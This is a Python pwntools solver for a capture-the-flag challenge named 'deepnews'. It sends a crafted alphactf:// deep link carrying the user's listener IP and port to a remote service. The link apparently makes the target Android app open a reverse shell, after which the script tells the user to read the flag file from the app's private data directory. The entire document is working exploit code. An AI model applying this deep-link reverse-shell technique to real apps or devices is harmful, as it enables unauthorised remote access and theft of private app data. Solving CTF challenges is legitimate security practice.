#! python3

import argparse
from pwn import *

RHOST = "rev.alphactf.online"
RPORT = "9001"

parser = argparse.ArgumentParser(description="Solve deepnews challenge")

parser.add_argument("-lhost", type=str, help="your machine ip address", required=True)
parser.add_argument("-lport", type=str, help="your machine port", required=True)

parser.add_argument("-rhost", type=str, help=f"remote machine ip address default({RHOST})", required=False)
parser.add_argument("-rport", type=str, help=f"remote machine port default({RPORT})", required=False)


args = parser.parse_args()


def main():
    rhost = args.rhost if args.rhost else RHOST
    rport = args.rport if args.rport else RPORT

    lhost = args.lhost
    lport = args.lport

    print(f"You should listen on {lhost}:{lport} for the remote connection")
    print("Once u get connection back u can cat /data/data/com.alphactf.deepnews/flag.txt")

    p = remote(rhost, rport)

    payload = f"alphactf://deepnews/?articleId=684dfb28-9e59-4354-9592-6f382f5ac372&sender=roacult1337&param1={lhost}&param2={lport}"

    p.recvuntil(b"link: ")
    p.sendline(payload.encode())

    print(p.recvall())


if __name__ == "__main__":
    main()

    